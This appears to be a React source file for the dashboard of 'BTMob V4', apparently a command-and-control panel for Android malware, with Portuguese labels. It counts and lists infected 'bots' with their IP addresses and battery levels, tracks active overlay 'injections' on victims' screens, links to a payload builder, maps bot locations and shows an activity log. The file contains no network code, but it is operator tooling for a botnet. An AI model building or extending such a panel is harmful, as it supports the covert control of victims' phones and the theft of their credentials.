import React from 'react';
import type { Bot, ActionLog } from '../types';

interface DashboardProps {
  bots: Bot[];
  logs: ActionLog[];
  onSelectBot: (botId: string) => void;
  onNavigate: (tab: string) => void;
}

export const Dashboard: React.FC<DashboardProps> = ({ bots, logs, onSelectBot, onNavigate }) => {
  const totalBots = bots.length;
  const onlineBots = bots.filter(b => b.status === 'online').length;
  const offlineBots = totalBots - onlineBots;
  
  // Calculate stats
  const activeInjections = bots.filter(b => b.screenState !== 'unlocked' && b.status === 'online').length;

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '24px', padding: '24px' }}>
      {/* Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
        <div>
          <h2 style={{ fontSize: '28px', fontWeight: '600', color: 'var(--text-primary)' }} className="title-glow">
            Painel Geral
          </h2>
          <p style={{ color: 'var(--text-secondary)' }}>Visão geral do servidor BTMob V4</p>
        </div>
        <div style={{ display: 'flex', gap: '8px' }}>
          <button className="btn btn-secondary" onClick={() => onNavigate('builder')} style={{ padding: '8px 16px' }}>
            🛠️ Novo Payload
          </button>
          <button className="btn btn-primary" onClick={() => onNavigate('bots')} style={{ padding: '8px 16px' }}>
            🤖 Ver Dispositivos
          </button>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="stats-grid">
        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
          <span style={{ fontSize: '14px', color: 'var(--text-secondary)', fontWeight: '500' }}>DISPOSITIVOS TOTAL</span>
          <span style={{ fontSize: '36px', fontWeight: '700', color: 'var(--accent-purple)', textShadow: '0 0 10px rgba(139, 92, 246, 0.3)' }}>
            {totalBots}
          </span>
          <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Cadastrados na rede</span>
        </div>

        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
          <span style={{ fontSize: '14px', color: 'var(--text-secondary)', fontWeight: '500' }}>BOTS ONLINE</span>
          <span style={{ fontSize: '36px', fontWeight: '700', color: 'var(--success)', textShadow: '0 0 10px rgba(16, 185, 129, 0.3)' }}>
            {onlineBots}
          </span>
          <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Prontos para comandos ({Math.round((onlineBots/totalBots)*100)}%)</span>
        </div>

        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
          <span style={{ fontSize: '14px', color: 'var(--text-secondary)', fontWeight: '500' }}>BOTS OFFLINE</span>
          <span style={{ fontSize: '36px', fontWeight: '700', color: 'var(--text-secondary)' }}>
            {offlineBots}
          </span>
          <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Sem contato recente</span>
        </div>

        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
          <span style={{ fontSize: '14px', color: 'var(--text-secondary)', fontWeight: '500' }}>INJEÇÕES ATIVAS</span>
          <span style={{ fontSize: '36px', fontWeight: '700', color: 'var(--accent-pink)', textShadow: '0 0 10px rgba(236, 72, 153, 0.3)' }}>
            {activeInjections}
          </span>
          <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Telas overlays ativas no momento</span>
        </div>
      </div>

      {/* Middle Row: Online Bots and World Map Simulation */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(350px, 1fr))', gap: '24px' }}>
        {/* Bots List Summary */}
        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <h3 style={{ fontSize: '18px', fontWeight: '600' }}>Dispositivos Online</h3>
            <span style={{ fontSize: '12px', color: 'var(--accent-cyan)', cursor: 'pointer' }} onClick={() => onNavigate('bots')}>
              Ver todos →
            </span>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', overflowY: 'auto', maxHeight: '280px' }}>
            {bots.filter(b => b.status === 'online').length === 0 ? (
              <p style={{ color: 'var(--text-muted)', textAlign: 'center', padding: '20px 0' }}>Nenhum dispositivo online no momento.</p>
            ) : (
              bots.filter(b => b.status === 'online').map(bot => (
                <div 
                  key={bot.id} 
                  onClick={() => onSelectBot(bot.id)}
                  style={{ 
                    padding: '12px', 
                    borderRadius: '8px', 
                    background: 'var(--bg-secondary)', 
                    border: '1px solid var(--border-color)',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease'
                  }}
                  className="bot-item-hover"
                >
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span style={{ fontSize: '16px' }}>🇧🇷</span>
                      <span style={{ fontWeight: '500', fontSize: '14px' }}>{bot.name}</span>
                    </div>
                    <div style={{ display: 'flex', gap: '8px', fontSize: '12px', color: 'var(--text-secondary)' }}>
                      <span>IP: {bot.ip}</span>
                      <span>•</span>
                      <span style={{ color: 'var(--accent-cyan)' }}>{bot.tag}</span>
                    </div>
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '4px' }}>
                    <span className="badge badge-online">online</span>
                    <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Bateria: {bot.battery}%</span>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        {/* Dynamic Vector Map Simulation */}
        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <h3 style={{ fontSize: '18px', fontWeight: '600' }}>Geolocalização dos Bots</h3>
          <div style={{ 
            flex: 1, 
            height: '280px', 
            background: 'var(--bg-secondary)', 
            borderRadius: '8px', 
            border: '1px solid var(--border-color)',
            position: 'relative',
            overflow: 'hidden',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            {/* Mock Vector Map Graphic */}
            <svg viewBox="0 0 1000 500" style={{ width: '100%', height: '100%', opacity: 0.25 }}>
              <path fill="var(--text-secondary)" d="M150,150 Q180,100 250,120 T350,180 T500,120 T650,200 T800,100 T900,180 L900,400 L100,400 Z" />
              <path fill="var(--text-secondary)" d="M200,320 Q220,280 260,300 T300,340 T420,300 T580,360 T700,280 T850,330 T950,280 L950,480 L150,480 Z" opacity="0.5" />
            </svg>
            
            {/* Blinking Location Markers */}
            {bots.filter(b => b.status === 'online').map((bot, i) => {
              // Distribute markers in simulated locations
              const coords = [
                { top: '65%', left: '42%', label: 'São Paulo' },
                { top: '58%', left: '38%', label: 'Brasília' },
                { top: '60%', left: '45%', label: 'Rio de Janeiro' },
                { top: '35%', left: '60%', label: 'Nova York' },
              ];
              const pos = coords[i % coords.length];
              return (
                <div 
                  key={bot.id}
                  style={{ 
                    position: 'absolute', 
                    top: pos.top, 
                    left: pos.left,
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    cursor: 'pointer'
                  }}
                  onClick={() => onSelectBot(bot.id)}
                >
                  <div style={{
                    width: '12px',
                    height: '12px',
                    borderRadius: '50%',
                    backgroundColor: 'var(--accent-pink)',
                    boxShadow: '0 0 8px var(--accent-pink)',
                    animation: 'pulse-glow 1.5s infinite'
                  }} />
                  <div style={{
                    background: 'rgba(0,0,0,0.85)',
                    border: '1px solid var(--accent-pink)',
                    borderRadius: '4px',
                    padding: '2px 6px',
                    fontSize: '10px',
                    color: 'white',
                    whiteSpace: 'nowrap',
                    marginTop: '4px',
                    transform: 'translateY(-2px)'
                  }}>
                    {bot.name.split(' ')[0]} ({pos.label})
                  </div>
                </div>
              );
            })}

            <div style={{ position: 'absolute', bottom: '8px', right: '8px', fontSize: '11px', color: 'var(--text-muted)' }}>
              Simulação de rede global de satélites
            </div>
          </div>
        </div>
      </div>

      {/* Activity Logs Console Feed */}
      <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <h3 style={{ fontSize: '18px', fontWeight: '600' }}>Histórico Geral de Atividades</h3>
          <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Servidor em tempo real</span>
        </div>

        <div style={{ 
          background: 'var(--bg-primary)', 
          border: '1px solid var(--border-color)', 
          borderRadius: '8px', 
          padding: '16px', 
          maxHeight: '260px', 
          overflowY: 'auto',
          display: 'flex',
          flexDirection: 'column',
          gap: '8px',
          fontFamily: 'var(--font-mono)',
          fontSize: '13px'
        }}>
          {logs.map(log => {
            let color = 'var(--text-secondary)';
            if (log.type === 'success') color = 'var(--success)';
            if (log.type === 'warning') color = 'var(--warning)';
            if (log.type === 'error') color = 'var(--danger)';
            
            return (
              <div key={log.id} className="log-item-animated" style={{ display: 'flex', gap: '12px', borderBottom: '1px solid rgba(255,255,255,0.03)', paddingBottom: '6px' }}>
                <span style={{ color: 'var(--text-muted)' }}>[{log.timestamp}]</span>
                {log.botName && (
                  <span 
                    style={{ color: 'var(--accent-purple)', cursor: 'pointer', textDecoration: 'underline' }}
                    onClick={() => log.botId && onSelectBot(log.botId)}
                  >
                    [{log.botName}]
                  </span>
                )}
                <span style={{ color }}>{log.message}</span>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
};
